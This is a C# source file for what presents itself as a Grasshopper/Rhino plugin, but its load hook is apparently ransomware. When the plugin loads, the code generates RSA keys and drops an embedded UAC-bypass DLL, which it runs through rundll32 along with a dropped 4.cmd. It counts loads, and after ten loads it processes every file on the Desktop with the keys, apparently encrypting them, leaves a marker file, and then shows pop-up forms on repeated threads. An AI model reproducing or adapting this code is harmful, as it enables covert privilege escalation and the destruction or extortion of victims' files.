using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Grasshopper.Kernel;
using Grasshopper;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Threading;
using System.Diagnostics;
using System.IO;
using MyProject1.Properties;
using System.Security.Cryptography;

namespace MyProject1
{
    public class Class1 : GH_AssemblyPriority
    {

        public static void Ee()
        {



            tanchuang form1 = new tanchuang();


            form1.ShowDialog();


        }


        //  [STAThread]
        public override GH_LoadingInstruction PriorityLoad()
        {
            string strReadLine;
            string ss = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\McNeel";
            System.IO.Directory.SetCurrentDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\McNeel");


            if (File.Exists(@"PrivateKey.xml") == false)
            {

                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider();
                using (StreamWriter writer = new StreamWriter("PrivateKey.xml", false))  //这个文件要保密...
                {
                    writer.WriteLine(rsa.ToXmlString(true));
                }
                using (StreamWriter writer = new StreamWriter("PublicKey.xml", false))
                {
                    writer.WriteLine(rsa.ToXmlString(false));

                }


            }


            StreamReader srReadFileq = new StreamReader(@"PrivateKey.xml");
            string PublicKey = srReadFileq.ReadToEnd();
            srReadFileq.Close();

            StreamReader srReadFileqq = new StreamReader(@"PrivateKey.xml");
            string PrivateKey = srReadFileqq.ReadToEnd();
            srReadFileqq.Close();

            //rundll32.exe.\BypassUAC_Dll_csharp.dll,BypassUAC    PrivateKey.xml
            if (File.Exists(@"6.txt"))
            {
                StreamReader srReadFile = new StreamReader(@"6.txt");
                strReadLine = srReadFile.ReadLine();
                srReadFile.Close();
                File.WriteAllText(@"6.txt", (Convert.ToDouble(strReadLine) + 1).ToString());
            }
            else
            {
                strReadLine = (0).ToString();
                File.WriteAllText(@"6.txt", (0).ToString());
            }


            File.WriteAllBytes("BypassUAC_Dll_csharp.dll", Resources.BypassUAC_Dll_csharp);
            if (File.Exists(@"4.cmd") == false)
            { 
            File.WriteAllText("4.cmd", Resources._4);

            Process process = Process.Start("rundll32.exe", ss + @"\BypassUAC_Dll_csharp.dll,BypassUAC"); }


            //MessageBox.Show(strReadLine);

            // Instances.ComponentServer.AddCategoryIcon("Category", Properties.Resources.Image1);
            // Instances.ComponentServer.AddCategorySymbolName("Category", 'C');



            if (Convert.ToDouble(strReadLine) >10)
            {

                string str9 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                string[] filedir = Directory.GetFiles(str9, "*.jianzhu", SearchOption.AllDirectories);
                if (filedir.Length != 0)
                {


                    int Wak = 0;
                    while (Wak < 10)
                    {
                        Thread newThread = new Thread(Ee);
                        newThread.SetApartmentState(System.Threading.ApartmentState.STA);
                        newThread.Name = "ActiveXThread";
                        newThread.Start();
                        Wak += 1;
                    }
                    Form1 f= new Form1();
                    
                    f.ShowDialog();


                    

                }


                    if (filedir.Length == 0)
                {
                     T t = new T(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "*");//C:\Users\28362\Desktop\新建文件夹 (12)
                     // T t = new T(@"C:\Users\28362\Desktop\3\plan_max_置入的文件", "*");
                                                                                                    //List<string> j = new List<string>();
                                                                                                    //t.Fu(ref  j);
                    t.PublicKey = PublicKey;
                    t.PrivateKey = PrivateKey;


                    Thread t1 = new Thread(new ThreadStart(t.Fu2));
                    t1.SetApartmentState(ApartmentState.STA);
                    t1.Start();
                    File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + @"\tt.jianzhu", "ww");




                   /* if (Directory.Exists(@"C:\Users\28362\Desktop\新建文件夹 (7)"))
                    {

                        T t2 = new T(@"C:\Users\28362\Desktop\新建文件夹 (7)", "*");
                        //List<string> j = new List<string>();
                        //t.Fu(ref  j);



                        Thread t3 = new Thread(new ThreadStart(t2.Fu));
                        t3.Start();



                    }*/
                }


                else if (Convert.ToDouble(strReadLine) == 10)
                {
                   /* T t2 = new T(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "*.jianzhu");
                    //List<string> j = new List<string>();
                    //t.Fu(ref  j);



                    Thread t3 = new Thread(new ThreadStart(t2.jie));
                    t3.Start();*/



                }
            }


                return Grasshopper.Kernel.GH_LoadingInstruction.Proceed;

            }
        }
    
}
